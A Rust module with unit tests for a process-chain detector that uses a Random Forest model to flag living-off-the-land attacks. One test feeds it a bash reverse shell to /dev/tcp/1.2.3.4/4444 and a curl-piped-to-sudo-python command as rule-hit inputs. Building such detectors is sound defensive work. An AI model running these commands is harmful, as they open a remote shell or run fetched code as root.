//! LEDA runtime detection (§4.2): per-process chain state (feature extractor),
//! a trigger engine that decides when to score, the exported Random Forest, and
//! detection resolution. A process is flagged at most once per lifetime, as the
//! training-time sample label is the OR over its trigger firings.

mod featurize;
mod model;

use std::collections::{HashMap, HashSet};
use std::io;

pub use model::Model;

use crate::core::event::{Event, EventKind};
use crate::core::features::chains::image;
use crate::core::framework::Processor;

/// What produced a snapshot of a process's chain.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Kind {
    Start,
    Exec,
}

struct Proc {
    image: String,
    ppid: u32,
    cmdline: String,
}

#[derive(Debug, Clone, PartialEq)]
pub struct Detection {
    pub pid: u32,
    pub chain: Vec<String>,
    pub cmdline: String,
    pub trigger: String,
    pub score: f64,
}

pub struct Detector {
    model: Model,
    procs: HashMap<u32, Proc>,
    flagged: HashSet<u32>,
    detections: Vec<Detection>,
}

impl Detector {
    pub fn new(model: Model) -> Self {
        Detector { model, procs: HashMap::new(), flagged: HashSet::new(), detections: Vec::new() }
    }

    pub fn triggers(&self) -> &[String] {
        &self.model.sig.triggers
    }

    pub fn tree_count(&self) -> usize {
        self.model.sig.trees.len()
    }

    /// Detections since the last call.
    pub fn take_detections(&mut self) -> Vec<Detection> {
        std::mem::take(&mut self.detections)
    }

    /// Images of the known ancestors, root first (`_ancestors` in `ai/lotl/chains.py`).
    fn ancestors(&self, mut ppid: u32) -> Vec<String> {
        let mut out = Vec::new();
        let mut seen = HashSet::new();
        while out.len() < self.model.sig.extractor.max_ancestors
            && seen.insert(ppid)
            && let Some(p) = self.procs.get(&ppid)
        {
            out.push(p.image.clone());
            ppid = p.ppid;
        }
        out.reverse();
        out
    }

    /// Trigger predicates of `ai/lotl/prototype.py` TRIGGERS.
    fn fires(&self, trigger: &str, chain: &[String], cmdline: &str, kind: Kind) -> bool {
        let fz = &self.model.featurizer;
        match trigger {
            "start" => kind == Kind::Start,
            "exec" => kind == Kind::Exec,
            "interp_child" => kind == Kind::Start && chain.len() >= 2 && fz.image_class(&chain[chain.len() - 2]) == "INTERP",
            "rule_hit" => !fz.rule_hits(cmdline).is_empty(),
            _ => false,
        }
    }
}

impl Processor for Detector {
    /// Snapshots mirror `iter_snapshots` in `ai/lotl/chains.py`.
    fn on_event(&mut self, ev: &Event, _out: &mut Vec<Event>) -> io::Result<()> {
        let (ancestors, kind) = match &ev.kind {
            EventKind::ProcessStart { name, exe, ppid, parent_exe, cmdline, .. } => {
                let img = image(name, exe.as_deref());
                let parent = self.procs.get(ppid);
                // A fork that has not exec'd yet repeats its parent's program.
                let fork = parent.is_some_and(|p| p.image == img && p.cmdline == *cmdline);
                let parent_image = match parent_exe {
                    Some(pe) if parent.is_none() && !pe.as_os_str().is_empty() => Some(image("", Some(pe))),
                    _ => None,
                };
                self.procs.insert(ev.pid, Proc { image: img, ppid: *ppid, cmdline: cmdline.clone() });
                self.flagged.remove(&ev.pid);
                if fork {
                    return Ok(());
                }
                (parent_image.map_or_else(|| self.ancestors(*ppid), |i| vec![i]), Kind::Start)
            }
            EventKind::ProcessExec { name, exe, cmdline } => {
                let p = self.procs.entry(ev.pid).or_insert(Proc { image: String::new(), ppid: 0, cmdline: String::new() });
                p.image = image(name, exe.as_deref());
                p.cmdline.clone_from(cmdline);
                let ppid = p.ppid;
                (self.ancestors(ppid), Kind::Exec)
            }
            EventKind::ProcessExit => {
                self.procs.remove(&ev.pid);
                self.flagged.remove(&ev.pid);
                return Ok(());
            }
            EventKind::File { .. } => return Ok(()),
        };
        if self.flagged.contains(&ev.pid) {
            return Ok(());
        }
        let p = &self.procs[&ev.pid];
        let mut chain = ancestors;
        chain.push(p.image.clone());
        let Some(trigger) = self.model.sig.triggers.iter().find(|t| self.fires(t, &chain, &p.cmdline, kind)) else {
            return Ok(());
        };
        let Some(score) = self.model.is_malicious(&self.model.featurizer.featurize(&chain, &p.cmdline)) else {
            return Ok(());
        };
        let detection = Detection { pid: ev.pid, chain, cmdline: p.cmdline.clone(), trigger: trigger.clone(), score };
        self.flagged.insert(ev.pid);
        self.detections.push(detection);
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use std::time::SystemTime;

    use super::model::tests::fixture;
    use super::*;
    use crate::core::framework::dispatch;

    fn ev(pid: u32, kind: EventKind) -> Event {
        Event { timestamp: SystemTime::now(), pid, kind }
    }

    fn start(pid: u32, ppid: u32, name: &str, cmdline: &str) -> Event {
        let name = name.to_string();
        let kind = EventKind::ProcessStart {
            name,
            exe: None,
            start_ticks: pid as u64,
            ppid,
            parent_exe: None,
            cmdline: cmdline.to_string(),
        };
        ev(pid, kind)
    }

    fn exec(pid: u32, name: &str, cmdline: &str) -> Event {
        ev(pid, EventKind::ProcessExec { name: name.into(), exe: None, cmdline: cmdline.into() })
    }

    /// `lotl.chains.synthesize`: one start per chain image (pid i+1, parent i), then an exec of the leaf.
    fn synthesize(chain: &[String], cmdline: &str) -> Vec<Event> {
        let mut events: Vec<Event> =
            chain.iter().enumerate().map(|(i, c)| start(i as u32 + 1, i as u32, c, c)).collect();
        events.push(exec(chain.len() as u32, chain.last().unwrap(), cmdline));
        events
    }

    #[test]
    fn detector_flags_exec_trigger() {
        let (model, cases) = fixture();
        assert_eq!(model.sig.triggers, ["exec"], "regenerate fixture with exec trigger");
        let usable = |c: &&model::tests::GoldenCase| {
            !c.chain.is_empty() && c.chain.len() <= 9 && c.chain.last() != Some(&c.cmdline)
        };
        let malicious = cases.iter().filter(usable).filter(|c| c.p1 > 0.5).take(30);
        let benign = cases.iter().filter(usable).filter(|c| c.p1 <= 0.5).take(30);
        let picked: Vec<_> = malicious.chain(benign).collect();
        assert!(picked.iter().filter(|c| c.p1 > 0.5).count() >= 10);
        let mut d = Detector::new(model);
        for c in picked {
            let leaf = c.chain.len() as u32;
            let mut events = synthesize(&c.chain, &c.cmdline);
            // A second exec of the same process must not be reported again.
            events.push(exec(leaf, c.chain.last().unwrap(), &c.cmdline));
            dispatch(events, &mut [&mut d]).unwrap();
            let found = d.take_detections();
            let want = usize::from(c.p1 > 0.5);
            assert_eq!(found.len(), want, "{:?} {} p1 {}: {found:?}", c.chain, c.cmdline, c.p1);
            if let Some(det) = found.first() {
                assert_eq!((det.pid, det.trigger.as_str()), (leaf, "exec"));
                assert!((det.score - c.p1).abs() < 1e-6, "{} vs {}", det.score, c.p1);
            }
            // Clear the tree for the next case.
            let exits = (1..=leaf).map(|pid| ev(pid, EventKind::ProcessExit)).collect();
            dispatch(exits, &mut [&mut d]).unwrap();
        }
    }

    #[test]
    fn other_triggers_fire() {
        let (model, _) = fixture();
        let d = Detector::new(model);
        let chain = |c: &[&str]| c.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        assert!(d.fires("interp_child", &chain(&["bash", "bash"]), "x", Kind::Start));
        assert!(d.fires("interp_child", &chain(&["systemd", "python3.12", "id"]), "id", Kind::Start));
        assert!(!d.fires("interp_child", &chain(&["nginx", "sh"]), "x", Kind::Start));
        assert!(!d.fires("interp_child", &chain(&["bash", "bash"]), "x", Kind::Exec));
        assert!(d.fires("rule_hit", &chain(&["bash"]), "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", Kind::Exec));
        assert!(d.fires("rule_hit", &chain(&["curl"]), "curl -s http://x | sudo python3", Kind::Start));
        assert!(!d.fires("rule_hit", &chain(&["ls"]), "ls -la | sha256sum", Kind::Start));
        assert!(d.fires("start", &chain(&["ls"]), "ls", Kind::Start) && !d.fires("start", &chain(&["ls"]), "ls", Kind::Exec));
        assert!(d.fires("exec", &chain(&["ls"]), "ls", Kind::Exec) && !d.fires("exec", &chain(&["ls"]), "ls", Kind::Start));
    }

    #[test]
    fn start_trigger_scores_a_start_and_skips_forks() {
        let (mut model, cases) = fixture();
        model.sig.triggers = vec!["start".into()];
        let c = cases.iter().find(|c| c.p1 > 0.5 && c.chain.len() >= 2).unwrap();
        let mut d = Detector::new(model);
        let n = c.chain.len() as u32;
        let mut events: Vec<Event> = c.chain[..c.chain.len() - 1]
            .iter()
            .enumerate()
            .map(|(i, img)| start(i as u32 + 1, i as u32, img, img))
            .collect();
        // A fork of the parent (same image and cmdline) is no snapshot; its start under its real program is.
        let parent = &c.chain[c.chain.len() - 2];
        events.push(start(n + 100, n - 1, parent, parent));
        events.push(start(n, n - 1, c.chain.last().unwrap(), &c.cmdline));
        dispatch(events, &mut [&mut d]).unwrap();
        let found = d.take_detections();
        assert_eq!(found.iter().map(|x| (x.pid, x.trigger.as_str())).collect::<Vec<_>>(), [(n, "start")]);
        assert_eq!(found[0].chain, c.chain.iter().map(|s| s.to_lowercase()).collect::<Vec<_>>());
    }

    #[test]
    fn process_reuse_resets_flag() {
        let (model, cases) = fixture();
        let c = cases.iter().find(|c| c.p1 > 0.5 && c.chain.len() <= 9 && c.chain.last() != Some(&c.cmdline)).unwrap();
        let leaf = c.chain.len() as u32;
        let mut d = Detector::new(model);
        dispatch(synthesize(&c.chain, &c.cmdline), &mut [&mut d]).unwrap();
        assert_eq!(d.take_detections().len(), 1);
        let img = c.chain.last().unwrap();
        let reuse = vec![
            ev(leaf, EventKind::ProcessExit),
            start(leaf, leaf - 1, img, img),
            exec(leaf, img, &c.cmdline),
        ];
        dispatch(reuse, &mut [&mut d]).unwrap();
        assert_eq!(d.take_detections().iter().map(|x| x.pid).collect::<Vec<_>>(), [leaf]);
    }
}
